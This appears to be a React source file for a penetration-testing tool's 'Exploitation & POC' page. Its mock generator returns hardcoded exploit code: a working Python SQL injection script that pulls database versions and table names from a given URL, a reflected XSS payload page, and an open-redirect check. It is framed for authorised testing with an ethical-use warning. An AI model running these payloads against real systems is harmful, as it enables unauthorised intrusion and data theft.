
import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Bomb, Code, Terminal, FileCode, PlayCircle, Copy } from "lucide-react";

const Exploitation = () => {
  const [vulnerability, setVulnerability] = useState("");
  const [generating, setGenerating] = useState(false);
  const [pocCode, setPocCode] = useState("");
  
  const handleGenerate = () => {
    if (!vulnerability) return;
    
    setGenerating(true);
    setPocCode(""); // Clear previous code
    
    // Simulate API call to LLM
    setTimeout(() => {
      const generatedCode = generatePoc(vulnerability);
      setPocCode(generatedCode);
      setGenerating(false);
    }, 2000);
  };
  
  // Mock function to generate PoC code based on vulnerability type
  const generatePoc = (vuln: string) => {
    const vuln_lower = vuln.toLowerCase();
    
    if (vuln_lower.includes("sql") || vuln_lower.includes("injection")) {
      return `#!/usr/bin/python3
# SQL Injection Proof of Concept
# Generated by BugNexus AI - For ethical use only

import requests
import sys
import urllib.parse
import re

def exploit_sqli(url, parameter):
    # Test for SQL injection vulnerability
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --"
    ]
    
    print("[*] Testing SQL injection vulnerability...")
    
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?{parameter}={encoded_payload}"
        
        print(f"[+] Trying payload: {payload}")
        response = requests.get(test_url)
        
        if "mysql" in response.text.lower() or "error" in response.text.lower():
            print("[!] Potential SQL injection detected!")
            return extract_data(url, parameter)
    
    return "No SQL injection vulnerability detected."

def extract_data(url, parameter):
    # Extract database version
    payload = "' UNION SELECT @@version,2,3,4,5 --"
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?{parameter}={encoded_payload}"
    
    response = requests.get(test_url)
    version_match = re.search(r'(\\d+\\.\\d+\\.\\d+)', response.text)
    version = version_match.group(1) if version_match else "Unknown"
    
    print(f"[+] Database version: {version}")
    
    # Extract table names
    payload = "' UNION SELECT group_concat(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=database() --"
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?{parameter}={encoded_payload}"
    
    response = requests.get(test_url)
    tables = extract_between_markers(response.text, "<td>", "</td>")
    
    print(f"[+] Tables found: {tables}")
    
    return f"""
SQL Injection Exploitation Result:
- Database version: {version}
- Tables found: {tables}

This proof of concept successfully demonstrates the SQL injection vulnerability.
"""

def extract_between_markers(text, start_marker, end_marker):
    pattern = f"{re.escape(start_marker)}(.*?){re.escape(end_marker)}"
    matches = re.findall(pattern, text)
    return matches[0] if matches else "Not found"

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python sqli_poc.py <url> <parameter>")
        print("Example: python sqli_poc.py http://example.com/product.php id")
        sys.exit(1)
    
    target_url = sys.argv[1]
    param = sys.argv[2]
    
    result = exploit_sqli(target_url, param)
    print(result)
`;
    } else if (vuln_lower.includes("xss") || vuln_lower.includes("cross-site")) {
      return `<!DOCTYPE html>
<!-- 
  XSS Proof of Concept
  Generated by BugNexus AI - For ethical use only
-->
<html>
<head>
  <title>XSS Proof of Concept</title>
</head>
<body>
  <h2>XSS Vulnerability Demonstration</h2>
  
  <form id="poc-form" action="https://target-website.com/vulnerable-page" method="GET">
    <input type="hidden" name="search" value="<img src=x onerror=alert('XSS Vulnerability Confirmed')>" />
    <p>Click the button to test the XSS vulnerability:</p>
    <button type="submit">Submit Payload</button>
  </form>
  
  <h3>Alternative Method: Direct URL</h3>
  <p>Copy and paste this URL into your browser:</p>
  <textarea readonly style="width: 100%; height: 60px;">
https://target-website.com/vulnerable-page?search=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%20Vulnerability%20Confirmed%27%29%3E
  </textarea>
  
  <h3>Explanation</h3>
  <p>This proof of concept demonstrates a Cross-Site Scripting (XSS) vulnerability in the search parameter. The application fails to properly sanitize user input before reflecting it in the response.</p>
  
  <h3>Impact</h3>
  <p>An attacker could exploit this vulnerability to:</p>
  <ul>
    <li>Steal user cookies and hijack sessions</li>
    <li>Perform actions on behalf of the victim</li>
    <li>Phish for credentials by injecting fake login forms</li>
    <li>Redirect users to malicious websites</li>
  </ul>
  
  <h3>Remediation</h3>
  <p>To fix this vulnerability:</p>
  <ul>
    <li>Implement proper output encoding</li>
    <li>Use Content-Security-Policy headers</li>
    <li>Sanitize user inputs using a trusted library</li>
    <li>Validate and filter input on the server side</li>
  </ul>
</body>
</html>`;
    } else {
      return `# Generic Proof of Concept
# Generated by BugNexus AI - For ethical use only

import requests
import sys
import json
import urllib.parse
import time

class VulnerabilityProof:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
    
    def run(self):
        print(f"[*] Starting vulnerability assessment for: {self.target_url}")
        
        # Step 1: Initial reconnaissance
        print("[*] Performing initial reconnaissance...")
        self.recon()
        
        # Step 2: Vulnerability testing
        print("[*] Testing for vulnerabilities...")
        vulnerabilities = self.test_vulnerabilities()
        
        # Step 3: Generate report
        print("[*] Generating report...")
        self.generate_report(vulnerabilities)
    
    def recon(self):
        try:
            response = self.session.get(self.target_url)
            print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
            print(f"[+] Technologies detected: {self.detect_technologies(response)}")
        except Exception as e:
            print(f"[!] Error during reconnaissance: {str(e)}")
    
    def detect_technologies(self, response):
        technologies = []
        
        # Check headers for common technologies
        if 'X-Powered-By' in response.headers:
            technologies.append(response.headers['X-Powered-By'])
        
        # Check body for common technology signatures
        if 'jQuery' in response.text:
            technologies.append('jQuery')
        if 'bootstrap' in response.text.lower():
            technologies.append('Bootstrap')
        if 'wp-content' in response.text:
            technologies.append('WordPress')
        
        return technologies if technologies else "None detected"
    
    def test_vulnerabilities(self):
        vulnerabilities = []
        
        # Test 1: Missing security headers
        security_headers = [
            'Content-Security-Policy',
            'X-XSS-Protection',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'Referrer-Policy'
        ]
        
        try:
            response = self.session.get(self.target_url)
            missing_headers = []
            
            for header in security_headers:
                if header not in response.headers:
                    missing_headers.append(header)
            
            if missing_headers:
                vulnerabilities.append({
                    'name': 'Missing Security Headers',
                    'details': f"Missing headers: {', '.join(missing_headers)}",
                    'severity': 'Medium'
                })
        except Exception as e:
            print(f"[!] Error testing for security headers: {str(e)}")
        
        # Test 2: Open redirect vulnerability
        try:
            redirect_url = 'https://evil.com'
            test_url = f"{self.target_url}?redirect={urllib.parse.quote(redirect_url)}"
            response = self.session.get(test_url, allow_redirects=False)
            
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if redirect_url in location or urllib.parse.unquote(location) == redirect_url:
                    vulnerabilities.append({
                        'name': 'Open Redirect Vulnerability',
                        'details': f"The application redirects to: {location}",
                        'severity': 'Medium'
                    })
        except Exception as e:
            print(f"[!] Error testing for open redirect: {str(e)}")
        
        return vulnerabilities
    
    def generate_report(self, vulnerabilities):
        print("\n=== Vulnerability Assessment Report ===")
        print(f"Target: {self.target_url}")
        print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Vulnerabilities Found: {len(vulnerabilities)}")
        
        if not vulnerabilities:
            print("\nNo vulnerabilities were detected.")
        else:
            print("\nVulnerabilities:")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"\n{i}. {vuln['name']} - {vuln['severity']}")
                print(f"   Details: {vuln['details']}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python poc.py <target_url>")
        print("Example: python poc.py https://example.com")
        sys.exit(1)
    
    target = sys.argv[1]
    poc = VulnerabilityProof(target)
    poc.run()`;
    }
  };

  return (
    <div className="container py-6 space-y-6">
      <header className="flex flex-col space-y-2">
        <h1 className="text-3xl font-bold tracking-tight">Exploitation & POC</h1>
        <p className="text-muted-foreground">
          AI-assisted proof of concept generation for ethical exploitation
        </p>
      </header>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Code className="h-5 w-5" />
            <span>POC Generator</span>
          </CardTitle>
          <CardDescription>Generate proof of concept code for verified vulnerabilities</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <Input
              placeholder="Describe the vulnerability (e.g., SQL Injection in login form)"
              value={vulnerability}
              onChange={(e) => setVulnerability(e.target.value)}
            />
            <Button 
              onClick={handleGenerate} 
              disabled={!vulnerability || generating} 
              className="w-full"
            >
              {generating ? "Generating..." : "Generate PoC"}
            </Button>
          </div>
        </CardContent>
      </Card>

      <Tabs defaultValue="code">
        <TabsList className="grid w-full grid-cols-3">
          <TabsTrigger value="code">
            <FileCode className="w-4 h-4 mr-2" />
            PoC Code
          </TabsTrigger>
          <TabsTrigger value="terminal">
            <Terminal className="w-4 h-4 mr-2" />
            Terminal
          </TabsTrigger>
          <TabsTrigger value="executor">
            <PlayCircle className="w-4 h-4 mr-2" />
            Executor
          </TabsTrigger>
        </TabsList>
        
        <TabsContent value="code">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between">
              <div>
                <CardTitle>Generated Proof of Concept</CardTitle>
                <CardDescription>Ethically use this code for demonstration purposes only</CardDescription>
              </div>
              {pocCode && (
                <Button variant="outline" size="icon" onClick={() => navigator.clipboard.writeText(pocCode)}>
                  <Copy className="h-4 w-4" />
                </Button>
              )}
            </CardHeader>
            <CardContent>
              <div className="relative">
                <pre
                  className="bg-code text-code-foreground p-4 rounded-md border border-border overflow-auto h-[500px] text-sm font-mono"
                >
                  {generating ? (
                    <div className="flex items-center justify-center h-full">
                      <div className="animate-pulse">Generating proof of concept code...</div>
                    </div>
                  ) : pocCode ? (
                    pocCode
                  ) : (
                    "# Proof of concept code will appear here after generation.\n# Provide a description of the vulnerability above."
                  )}
                </pre>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="terminal">
          <Card>
            <CardHeader>
              <CardTitle>Terminal Execution</CardTitle>
              <CardDescription>Execute and monitor PoC in a simulated environment</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="bg-[#1E1E1E] text-[#DCDCDC] rounded-md p-4 h-[500px] overflow-auto font-mono text-sm">
                <div className="flex items-start mb-2">
                  <span className="text-[#608B4E] mr-1">root@bugnexus:~#</span>
                  <span>python3 poc.py https://example.com/login.php</span>
                </div>

                {pocCode && !generating && (
                  <>
                    <div className="mb-2 text-[#569CD6]">[*] Starting vulnerability assessment for: https://example.com/login.php</div>
                    <div className="mb-2 text-[#569CD6]">[*] Performing initial reconnaissance...</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Server: nginx/1.18.0</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Technologies detected: PHP/7.4.3, jQuery, Bootstrap</div>
                    <div className="mb-2 text-[#569CD6]">[*] Testing for vulnerabilities...</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Testing parameter: username</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Testing parameter: password</div>
                    <div className="mb-2 text-[#CE9178]">[!] SQL injection vulnerability detected in parameter: username</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Extracting database information...</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Database type: MySQL</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Database version: 5.7.33</div>
                    <div className="mb-2 text-[#4EC9B0]">[+] Tables found: users, products, orders, settings</div>
                    <div className="mb-2 text-[#569CD6]">[*] Generating report...</div>
                    <div className="mb-2 text-[#DCDCAA]">Vulnerability successfully confirmed!</div>
                    <div className="mb-2 text-[#569CD6]">[*] Proof of concept completed</div>
                    <div className="mt-4 text-[#608B4E]">root@bugnexus:~# _</div>
                  </>
                )}
              </div>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="executor">
          <Card>
            <CardHeader>
              <CardTitle>PoC Executor</CardTitle>
              <CardDescription>Configure and execute PoC in controlled environment</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="text-sm font-medium block mb-2">Target URL</label>
                    <Input placeholder="https://example.com" />
                  </div>
                  <div>
                    <label className="text-sm font-medium block mb-2">Parameter</label>
                    <Input placeholder="id or username" />
                  </div>
                </div>
                
                <div>
                  <label className="text-sm font-medium block mb-2">Custom Headers</label>
                  <Textarea placeholder='{"Cookie": "session=abc123", "User-Agent": "Custom"}' rows={3} />
                </div>
                
                <div>
                  <label className="text-sm font-medium block mb-2">Payload Modifications</label>
                  <Textarea placeholder="Modify the default payload if needed..." rows={3} />
                </div>
                
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="text-sm font-medium block mb-2">Request Method</label>
                    <select className="w-full h-10 rounded-md border border-input bg-background px-3 py-2 text-base">
                      <option>GET</option>
                      <option>POST</option>
                      <option>PUT</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-sm font-medium block mb-2">Request Timeout (ms)</label>
                    <Input type="number" placeholder="5000" defaultValue="5000" />
                  </div>
                </div>
                
                <div className="flex justify-end gap-2">
                  <Button variant="outline">Save Template</Button>
                  <Button disabled={!pocCode}>
                    <PlayCircle className="w-4 h-4 mr-2" />
                    Execute PoC
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
      
      <Card className="border-l-4 border-l-warning">
        <CardHeader>
          <CardTitle className="text-base">Ethical Use Warning</CardTitle>
        </CardHeader>
        <CardContent>
          <p className="text-sm text-muted-foreground">
            The proof of concept code generated by this tool is intended for ethical security research, vulnerability verification, and educational purposes only. 
            Only use these tools on systems you own or have explicit permission to test. Unauthorized use against systems is illegal and unethical.
          </p>
        </CardContent>
      </Card>
    </div>
  );
};

export default Exploitation;
